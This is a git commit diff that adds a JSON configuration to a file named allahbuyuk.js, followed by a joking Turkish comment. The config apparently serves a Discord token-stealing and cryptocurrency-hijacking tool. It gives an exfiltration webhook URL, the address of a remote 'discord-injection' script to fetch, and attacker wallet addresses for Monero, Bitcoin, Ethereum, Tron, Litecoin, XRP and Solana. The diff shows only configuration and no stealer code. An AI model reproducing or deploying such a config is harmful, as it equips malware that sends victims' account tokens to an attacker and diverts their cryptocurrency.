68b20051cb77b2e9ce8d09a8487705af1596226c
BulletART <83542089+Esrefpasa@users.noreply.github.com>
2026-05-03 05:56:38 +0300

    Update allahbuyuk.js

--- allahbuyuk.js
+++ allahbuyuk.js
@@ -1,1 +1,13 @@
+{
+  "webhook": "https://dusmanlarimyasamaz.pythonanywhere.com/api/bulletartisback",
+  "inj_url": "https://raw.githubusercontent.com/Esrefpasa/discord-injection/refs/heads/main/alacati.js",
+  "xmr_wallet": "472gZXJUodaV39mQxXrSgrYMGhJSydsUMAEbM7SM7mWY6bvKXq5WXbwHscDkWsxkbwCiFo2fxpCFZ1r9BCsaFMke8URVwmY",
+  "btc": "bc1q6jzfzxajec9n3rqqlg6cfwa5mwepkrz2ag7x2x",
+  "eth": "0x6B2A37D91377534499088F85fA0BaE03676ABb5b",
+  "trx": "TJiPqtJdBxZ8eqQmYqW61jy3ezKCsntYLu",
+  "ltc": "Lct9obafxaSEpJFj39e91AE7UYxeHXeZSB",
+  "xrp": "rwp9iLmaf1S5r84kbFB2Gxj24vabjne9oD",
+  "sol": "2rJ9S1L2CwFDmZNcYG778u8NNCy4s2hgNYRg7x2UxYMy"
+}
 
+// sen ne anlatiyon inmedikki biz hala sahnelerden 😀
